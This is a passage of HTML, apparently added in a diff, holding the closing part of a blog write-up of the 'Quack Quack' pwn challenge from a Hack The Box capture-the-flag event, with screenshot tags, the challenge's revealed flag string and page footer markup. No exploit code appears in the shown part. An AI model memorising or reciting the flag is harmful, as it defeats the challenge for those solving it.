+        data-srcset="/images/htb-cyber-apocalypse_pwn1-03.png, /images/htb-cyber-apocalypse_pwn1-03.png 1.5x, /images/htb-cyber-apocalypse_pwn1-03.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_pwn1-03.png"
+        title="Quack Quack-03" width="746" height="228" /></p>
+<p>After several attempts about 3 - 10 times, then I can successfully read the flag. Okay, now let&rsquo;s crack the remote machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_pwn1-04.png"
+        data-srcset="/images/htb-cyber-apocalypse_pwn1-04.png, /images/htb-cyber-apocalypse_pwn1-04.png 1.5x, /images/htb-cyber-apocalypse_pwn1-04.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_pwn1-04.png"
+        title="Quack Quack-04" width="1059" height="584" /></p>
+<h3 id="flag-4">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>HTB{~c4n4ry_g035_qu4ck_qu4ck~_c2c1c5fea57c3625c35e8a70d8b4be0a}</code></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/international/">International</a>,&nbsp;<a href="/tags/web-exploit/">Web Exploit</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/pwn/">Pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2025/03/pearl-ctf-2025-writeup/" class="prev" rel="prev" title="Pearl CTF 2025 Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pearl CTF 2025 Writeup</a>
+            <a href="/2025/06/install-ubuntu-gnome-from-scratch-using-debootstrap/" class="next" rel="next" title="Install Ubuntu GNOME from Scratch using debootstrap">Install Ubuntu GNOME from Scratch using debootstrap<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body>
+</html>
